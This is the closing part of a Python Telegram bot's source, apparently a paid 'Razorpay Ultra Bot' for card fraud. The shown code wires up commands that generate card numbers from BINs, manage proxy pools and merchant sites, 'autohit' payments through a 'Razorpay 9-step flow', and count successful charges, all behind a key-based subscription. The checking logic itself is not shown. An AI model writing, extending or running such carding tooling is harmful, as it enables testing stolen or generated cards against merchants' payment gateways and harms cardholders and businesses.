            f"  {e('money')}   Payments: <code>{pays}</code>\n"
            f"  {e('success')} Charged:  <code>{charged}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "menu_admin":
        await query.edit_message_text(
            f"{e('crown')} <b>Admin Panel</b>\n\n"
            f"  {e('key')}   <code>/genkey &lt;days&gt; [count]</code>\n"
            f"  {e('plan')}  <code>/addplan &lt;id&gt; &lt;days&gt;</code>\n"
            f"  {e('ban')}   <code>/ban &lt;id&gt;</code>\n"
            f"  {e('crown')} <code>/sudo &lt;id&gt;</code>\n"
            f"  {e('stats')} <code>/stats</code>\n\n"
            f"{e('fire')} Use /bhosade for full list",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
        return

    if data == "cb_stats":
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
        await query.edit_message_text(
            f"{e('stats')} Sites: <code>{sites}</code> | Proxies: <code>{proxies}</code> | "
            f"BINs: <code>{bins}</code> | Gen: <code>{gen}</code>",
            parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
        return

    if data == "cb_profile":
        uid2 = query.from_user.id
        role = await get_user_role(uid2)
        exp  = await redis.hget(f"bot:users:{uid2}", "plan_expiry") or ""
        exp_str = datetime.fromtimestamp(float(exp)).strftime("%Y-%m-%d") if exp else "None"
        await query.edit_message_text(
            f"{e('info')} <b>Profile</b>\n\n"
            f"ID: <code>{uid2}</code>\n"
            f"Role: <b>{safe(role)}</b>\n"
            f"Expiry: <code>{exp_str}</code>",
            parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
        return

    if data == "cb_help":
        await query.edit_message_text(
            f"{e('fire')} <b>Commands</b>\n\n"
            f"{e('card')} /gen BIN amount\n"
            f"{e('mass')} /split N (reply to txt)\n"
            f"{e('info')} /profile\n"
            f"{e('redeem')} /redeem KEY\n"
            f"{e('search')} /bhosade (admin)",
            parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
        return

    if data == "cb_info":
        await query.edit_message_text(
            f"{e('info')} <b>Bot Info</b>\n\n"
            f"  {e('fire')} v5.0 | {e('tds')} Upstash Redis\n"
            f"  {e('proxy')} 4 proxy formats\n"
            f"  {e('card')} Real Razorpay 9-step flow\n"
            f"  {e('key')} Key-based access system",
            parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
        return

    if data in ("gen_help", "split_help"):
        await query.edit_message_text(
            f"{e('card')} <b>/gen BIN amount</b>\n  <code>/gen 411111 100</code>\n\n"
            f"{e('mass')} <b>/split N</b>\n  Reply to .txt to split",
            parse_mode=ParseMode.HTML, reply_markup=main_keyboard())
        return

# ═══════════════════════════════════════════════════════════════
#              ERROR HANDLER
# ═══════════════════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Unhandled exception: {context.error}", exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"{e('error')} An internal error occurred. Please try again.\n"
                f"{e('loading')} If this persists, contact admin.",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#              STARTUP HEALTH CHECK
# ═══════════════════════════════════════════════════════════════

async def post_init(app) -> None:
    try:
        await redis.set("bot:heartbeat", str(int(time.time())))
        val     = await redis.get("bot:heartbeat")
        sites   = await redis.llen(RK_SITES)
        proxies = await redis.llen(RK_PROXIES)
        bins    = await redis.llen(RK_BINS)
        sudos   = len(await redis.smembers(RK_SUDO))
        logger.info(
            f"Redis OK heartbeat={val} | "
            f"sites={sites} proxies={proxies} bins={bins} sudo={sudos}")
    except Exception as ex:
        logger.error(f"Redis startup check failed: {ex}")

# ═══════════════════════════════════════════════════════════════
#              MAIN
# ═══════════════════════════════════════════════════════════════

def main() -> None:
    logger.info("╔══════════════════════════════════════════╗")
    logger.info("║   Razorpay Ultra Bot v5.0 — Starting...  ║")
    logger.info("╚══════════════════════════════════════════╝")

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    # Public commands
    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("info",       cmd_info))
    app.add_handler(CommandHandler("profile",    cmd_profile))
    app.add_handler(CommandHandler("redeem",     cmd_redeem))

    # Admin/sudo management
    app.add_handler(CommandHandler("sudo",       cmd_sudo))
    app.add_handler(CommandHandler("unsudo",     cmd_unsudo))
    app.add_handler(CommandHandler("sudolist",   cmd_sudolist))
    app.add_handler(CommandHandler("ban",        cmd_ban))
    app.add_handler(CommandHandler("unban",      cmd_unban))
    app.add_handler(CommandHandler("banlist",    cmd_banlist))
    app.add_handler(CommandHandler("addplan",    cmd_addplan))
    app.add_handler(CommandHandler("genkey",     cmd_genkey))

    # Site management
    app.add_handler(CommandHandler("addsite",    cmd_addsite))
    app.add_handler(CommandHandler("live",       cmd_live))
    app.add_handler(CommandHandler("checksite",  cmd_checksite))
    app.add_handler(CommandHandler("rmsite",     cmd_rmsite))

    # Proxy management
    app.add_handler(CommandHandler("addpxy",     cmd_addpxy))
    app.add_handler(CommandHandler("proxy",      cmd_proxy))
    app.add_handler(CommandHandler("testpxy",    cmd_testpxy))
    app.add_handler(CommandHandler("rmpxy",      cmd_rmpxy))
    app.add_handler(CommandHandler("clrpxy",     cmd_clrpxy))

    # BIN management
    app.add_handler(CommandHandler("addbim",     cmd_addbim))
    app.add_handler(CommandHandler("chkbim",     cmd_chkbim))
    app.add_handler(CommandHandler("rmbin",      cmd_rmbin))
    app.add_handler(CommandHandler("binlookup",  cmd_binlookup))

    # Payment testing
    app.add_handler(CommandHandler("fuck",       cmd_fuck))
    app.add_handler(CommandHandler("autohit",    cmd_autohit))
    app.add_handler(CommandHandler("stop",       cmd_stop))

    # Utilities
    app.add_handler(CommandHandler("gen",        cmd_gen))
    app.add_handler(CommandHandler("split",      cmd_split))
    app.add_handler(CommandHandler("stats",      cmd_stats))
    app.add_handler(CommandHandler("bhosade",    cmd_bhosade))

    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_error_handler(error_handler)

    logger.info(f"Admin UID: {ADMIN_USER_ID}")
    logger.info("Starting polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()